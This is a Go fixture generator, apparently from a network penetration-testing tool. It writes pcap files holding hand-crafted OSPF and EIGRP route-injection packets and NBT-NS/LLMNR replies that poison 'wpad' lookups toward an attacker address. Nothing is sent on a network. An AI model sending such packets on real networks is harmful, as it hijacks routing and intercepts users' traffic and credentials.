//go:build ignore

// harvest_routing.go generates routing-injection and rogue-WPAD attack
// reference fixtures into attacks/testdata/routing/*.pcap by crafting the
// exact byte sequences the routing behaviors produce. This is the KTD14
// fixture factory for the routing attack behaviors.
//
// Spec-authored (no baseline craft — R4 supersets): all fixtures are
// spec-authored because no baseline craft exists in l2l3-audit for these
// three attacks. The fixtures mirror the Go behaviors' craft functions
// byte-for-byte where deterministic.
//
// Fixtures produced:
//   - ospf.pcap:           hello, db-desc, lsa-update (attack TX)
//   - ospf_restore.pcap:   lsa-flush, goodbye-hello (teardown TX)
//   - ospf_target.pcap:    target hello response (FRR-shaped, fed via PushRX)
//   - eigrp.pcap:          hello (Init), route-inject update (attack TX)
//   - eigrp_restore.pcap:   goodbye hello (teardown TX)
//   - eigrp_target.pcap:   target hello response (fed via PushRX)
//   - eigrp_reject.pcap:    target goodbye (auth-mismatch refusal, fed via PushRX)
//   - wpad.pcap:           nbt-ns response, llmnr response (attack TX)
//
// Run from the attacks/routing directory:
//
//	go run harvest_routing.go
//
// Fully offline: no sockets, no scapy. Writes pcaps via pcapgo.
package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"
	"github.com/gopacket/gopacket/pcapgo"

	nl "go.aledante.io/FlowSeer/src/netpen/layers"
)

const srcMAC = "00:11:22:33:44:55"

var (
	ospfMcastMAC    = mustMAC("01:00:5e:00:00:05")
	eigrpMcastMAC   = mustMAC("01:00:5e:00:00:0a")
	broadcastMAC    = mustMAC("ff:ff:ff:ff:ff:ff")
	attackerIP      = net.IPv4(10, 0, 0, 99)
	ospfAllSPFRtrs  = net.IPv4(224, 0, 0, 5)
	eigrpMcast      = net.IPv4(224, 0, 0, 10)
	llmnrMcast      = net.IPv4(224, 0, 0, 252)
	targetMAC       = mustMAC("00:aa:bb:cc:dd:01")
	targetRouterID  uint32 = 0x0a000002 // 10.0.0.2
	attackerRouterID uint32 = 0x0a000099 // 10.0.0.99

	eigrpFlagInit    uint32 = 0x01
	eigrpFlagGoodbye uint32 = 0x02

	wpacTTL = 30
)

func mustMAC(s string) net.HardwareAddr {
	m, err := net.ParseMAC(s)
	panicErr(err)
	return m
}

func panicErr(err error) {
	if err != nil {
		panic(err)
	}
}

func srcBytes() net.HardwareAddr { return mustMAC(srcMAC) }

const (
	ospfHdrLen    = 24
	ospfHelloBody = 20
	ospfLSAHdrLen = 20
)

func main() {
	// OSPF fixtures
	writePcap("ospf.pcap", ospfHelloFrame(), ospfDBDescFrame(), ospfLSAUpdateFrame())
	writePcap("ospf_restore.pcap", ospfLSAFlushFrame(), ospfGoodbyeFrame())
	writePcap("ospf_target.pcap", ospfTargetHelloFrame())

	// EIGRP fixtures
	writePcap("eigrp.pcap", eigrpHelloFrame(eigrpFlagInit), eigrpRouteInjectFrame())
	writePcap("eigrp_restore.pcap", eigrpHelloFrame(eigrpFlagGoodbye))
	writePcap("eigrp_target.pcap", eigrpTargetHelloFrame())
	writePcap("eigrp_reject.pcap", eigrpRejectFrame())

	// WPAD fixtures
	writePcap("wpad.pcap", wpadNBTNSFrame(), wpadLLMNRFrame())

	fmt.Println("harvest complete")
}

// ---------------------------------------------------------------------------
// OSPF frames (raw craft — fork has no SerializeTo for OSPFv2)
// ---------------------------------------------------------------------------

func ospfHeader(ospfType byte, bodyLen int) []byte {
	hdr := make([]byte, ospfHdrLen)
	hdr[0] = 2 // version 2
	hdr[1] = ospfType
	binary.BigEndian.PutUint16(hdr[2:4], uint16(ospfHdrLen+bodyLen))
	binary.BigEndian.PutUint32(hdr[4:8], attackerRouterID)
	binary.BigEndian.PutUint32(hdr[8:12], 0) // area 0.0.0.0
	return hdr
}

func ospfHelloBodyBytes() []byte {
	body := make([]byte, ospfHelloBody)
	binary.BigEndian.PutUint32(body[0:4], 0xffffff00) // /24
	binary.BigEndian.PutUint16(body[4:6], 10)         // hello interval
	body[6] = 0x02                                      // options: E
	body[7] = 1                                         // priority
	binary.BigEndian.PutUint32(body[8:12], 40)         // dead interval
	binary.BigEndian.PutUint32(body[12:16], 0)         // DR
	binary.BigEndian.PutUint32(body[16:20], 0)         // BDR
	return body
}

func ospfFrame(ospfType byte, body []byte) []byte {
	hdr := ospfHeader(ospfType, len(body))
	payload := append(hdr, body...)
	eth := &layers.Ethernet{
		SrcMAC:       srcBytes(),
		DstMAC:       ospfMcastMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: 89,
		SrcIP:    attackerIP,
		DstIP:    ospfAllSPFRtrs,
	}
	return craft(eth, ip, gopacket.Payload(payload))
}

func ospfHelloFrame() []byte {
	return ospfFrame(byte(layers.OSPFHello), ospfHelloBodyBytes())
}

func ospfGoodbyeFrame() []byte {
	return ospfFrame(byte(layers.OSPFHello), ospfHelloBodyBytes())
}

func ospfDBDescFrame() []byte {
	body := make([]byte, 8)
	binary.BigEndian.PutUint16(body[0:2], 1500) // MTU
	body[2] = 0x02                               // options: E
	body[3] = 0x07                               // flags: I=1, M=1, MS=1
	binary.BigEndian.PutUint32(body[4:8], 1)    // DD seq
	return ospfFrame(byte(layers.OSPFDatabaseDescription), body)
}

func ospfLSAUpdateFrame() []byte {
	body := make([]byte, 4)
	binary.BigEndian.PutUint32(body, 1) // 1 LSA

	// Router-LSA
	lsaHdr := make([]byte, ospfLSAHdrLen)
	binary.BigEndian.PutUint16(lsaHdr[0:2], 1) // LSAge
	lsaHdr[2] = 0x02
	lsaHdr[3] = byte(layers.RouterLSAtypeV2)
	binary.BigEndian.PutUint32(lsaHdr[4:8], attackerRouterID)
	binary.BigEndian.PutUint32(lsaHdr[8:12], attackerRouterID)
	binary.BigEndian.PutUint32(lsaHdr[12:16], 0x80000001)

	lsaBody := make([]byte, 16)
	lsaBody[0] = 0x00
	lsaBody[1] = 0x00
	binary.BigEndian.PutUint16(lsaBody[2:4], 1)
	binary.BigEndian.PutUint32(lsaBody[4:8], attackerRouterID)
	binary.BigEndian.PutUint32(lsaBody[8:12], 0xffffff00)
	lsaBody[12] = 3
	binary.BigEndian.PutUint16(lsaBody[14:16], 10)

	binary.BigEndian.PutUint16(lsaHdr[18:20], uint16(len(lsaHdr)+len(lsaBody)))

	body = append(body, lsaHdr...)
	body = append(body, lsaBody...)
	return ospfFrame(byte(layers.OSPFLinkStateUpdate), body)
}

func ospfLSAFlushFrame() []byte {
	body := make([]byte, 4)
	binary.BigEndian.PutUint32(body, 1)

	lsaHdr := make([]byte, ospfLSAHdrLen)
	binary.BigEndian.PutUint16(lsaHdr[0:2], 3600) // maxAge
	lsaHdr[2] = 0x02
	lsaHdr[3] = byte(layers.RouterLSAtypeV2)
	binary.BigEndian.PutUint32(lsaHdr[4:8], attackerRouterID)
	binary.BigEndian.PutUint32(lsaHdr[8:12], attackerRouterID)
	binary.BigEndian.PutUint32(lsaHdr[12:16], 0x80000001)
	binary.BigEndian.PutUint16(lsaHdr[18:20], ospfLSAHdrLen)

	body = append(body, lsaHdr...)
	return ospfFrame(byte(layers.OSPFLinkStateUpdate), body)
}

func ospfTargetHelloFrame() []byte {
	// FRR-shaped target hello: router ID = 10.0.0.2, area 0
	hdr := make([]byte, ospfHdrLen)
	hdr[0] = 2
	hdr[1] = byte(layers.OSPFHello)
	body := ospfHelloBodyBytes()
	binary.BigEndian.PutUint32(hdr[4:8], targetRouterID)
	binary.BigEndian.PutUint32(hdr[8:12], 0)
	binary.BigEndian.PutUint16(hdr[2:4], uint16(len(hdr)+len(body)))
	// List attacker as neighbor (adjacency seen)
	nb := make([]byte, 4)
	binary.BigEndian.PutUint32(nb, attackerRouterID)
	body = append(body, nb...)
	binary.BigEndian.PutUint16(hdr[2:4], uint16(len(hdr)+len(body)))

	payload := append(hdr, body...)
	eth := &layers.Ethernet{
		SrcMAC:       targetMAC,
		DstMAC:       ospfMcastMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: 89,
		SrcIP:    net.IPv4(10, 0, 0, 2),
		DstIP:    ospfAllSPFRtrs,
	}
	return craft(eth, ip, gopacket.Payload(payload))
}

// ---------------------------------------------------------------------------
// EIGRP frames (owned layer)
// ---------------------------------------------------------------------------

func eigrpHelloFrame(flags uint32) []byte {
	eigrp := &nl.EIGRP{
		Version:          2,
		Opcode:           nl.EIGRPOpcodeHello,
		Flags:            flags,
		VirtualRouterID:  0,
		AutonomousSystem: 100,
	}
	return eigrpFrame(eigrp)
}

func eigrpRouteInjectFrame() []byte {
	routeValue := buildIPv4RouteTLV(24, net.IPv4(10, 99, 0, 0))
	eigrp := &nl.EIGRP{
		Version:          2,
		Opcode:           nl.EIGRPOpcodeUpdate,
		SequenceNumber:   1,
		VirtualRouterID:  0,
		AutonomousSystem: 100,
		TLVs: []nl.EIGRPTLV{
			{Type: 0x0102, Value: routeValue},
		},
	}
	return eigrpFrame(eigrp)
}

func eigrpFrame(eigrp *nl.EIGRP) []byte {
	eth := &layers.Ethernet{
		SrcMAC:       srcBytes(),
		DstMAC:       eigrpMcastMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: 88,
		SrcIP:    attackerIP,
		DstIP:    eigrpMcast,
	}
	return craft(eth, ip, eigrp)
}

func eigrpTargetHelloFrame() []byte {
	eigrp := &nl.EIGRP{
		Version:          2,
		Opcode:           nl.EIGRPOpcodeHello,
		Flags:            eigrpFlagInit,
		VirtualRouterID:  0,
		AutonomousSystem: 100,
	}
	eth := &layers.Ethernet{
		SrcMAC:       targetMAC,
		DstMAC:       eigrpMcastMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: 88,
		SrcIP:    net.IPv4(10, 0, 0, 2),
		DstIP:    eigrpMcast,
	}
	return craft(eth, ip, eigrp)
}

func eigrpRejectFrame() []byte {
	// Auth-mismatch rejection: target sends goodbye
	eigrp := &nl.EIGRP{
		Version:          2,
		Opcode:           nl.EIGRPOpcodeHello,
		Flags:            eigrpFlagGoodbye,
		VirtualRouterID:  0,
		AutonomousSystem: 100,
	}
	eth := &layers.Ethernet{
		SrcMAC:       targetMAC,
		DstMAC:       eigrpMcastMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: 88,
		SrcIP:    net.IPv4(10, 0, 0, 2),
		DstIP:    eigrpMcast,
	}
	return craft(eth, ip, eigrp)
}

func buildIPv4RouteTLV(prefixLen int, dest net.IP) []byte {
	var v []byte
	v = append(v, byte(prefixLen))
	networkBytes := (prefixLen + 7) / 8
	v = append(v, dest.To4()[:networkBytes]...)
	metricBytes := make([]byte, 16)
	binary.BigEndian.PutUint32(metricBytes[0:4], 1)  // delay = metric (1)
	binary.BigEndian.PutUint32(metricBytes[4:8], 1000)
	metricBytes[9] = 1
	metricBytes[10] = 255
	metricBytes[11] = 1
	v = append(v, metricBytes...)
	return v
}

// ---------------------------------------------------------------------------
// WPAD frames (owned NBNS + LLMNR layers)
// ---------------------------------------------------------------------------

func wpadNBTNSFrame() []byte {
	nbns := &nl.NBNS{
		ID:      0x1234,
		Flags:   0x8500,
		ANCount: 1,
		Answers: []nl.NBNSResourceRecord{
			{
				Name:  "wpad",
				Type:  0x0020,
				Class: 0x0001,
				TTL:   uint32(wpacTTL),
				Data:  nbnsNodeAddr(attackerIP),
			},
		},
	}
	eth := &layers.Ethernet{
		SrcMAC:       srcBytes(),
		DstMAC:       broadcastMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    attackerIP,
		DstIP:    net.IPv4(255, 255, 255, 255),
	}
	udp := &layers.UDP{SrcPort: 137, DstPort: 137}
	_ = udp.SetNetworkLayerForChecksum(ip)
	return craft(eth, ip, udp, nbns)
}

func nbnsNodeAddr(ip net.IP) []byte {
	data := make([]byte, 6)
	ip4 := ip.To4()
	copy(data[2:6], ip4)
	return data
}

func wpadLLMNRFrame() []byte {
	llmnr := &nl.LLMNR{
		ID:      0x5678,
		Flags:   0x8000,
		ANCount: 1,
		Answers: []nl.LLMNRResourceRecord{
			{
				Name:  "wpad",
				Type:  1,
				Class: 1,
				TTL:   uint32(wpacTTL),
				Data:  attackerIP.To4(),
			},
		},
	}
	eth := &layers.Ethernet{
		SrcMAC:       srcBytes(),
		DstMAC:       srcBytes(),
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    attackerIP,
		DstIP:    llmnrMcast,
	}
	udp := &layers.UDP{SrcPort: 5355, DstPort: 5355}
	_ = udp.SetNetworkLayerForChecksum(ip)
	return craft(eth, ip, udp, llmnr)
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

func craft(layersList ...gopacket.SerializableLayer) []byte {
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}
	panicErr(gopacket.SerializeLayers(buf, opts, layersList...))
	return append([]byte(nil), buf.Bytes()...)
}

func writePcap(path string, pkts ...[]byte) {
	fullPath := filepath.Join("..", "testdata", "routing", filepath.Base(path))
	f, err := os.Create(fullPath)
	panicErr(err)
	defer func() { _ = f.Close() }()

	w := pcapgo.NewWriter(f)
	panicErr(w.WriteFileHeader(65535, layers.LinkTypeEthernet))

	for _, pkt := range pkts {
		panicErr(w.WritePacket(gopacket.CaptureInfo{
			Timestamp:     time.Now(),
			CaptureLength: len(pkt),
			Length:        len(pkt),
		}, pkt))
	}
	fmt.Println("wrote", fullPath, len(pkts), "packets")
}
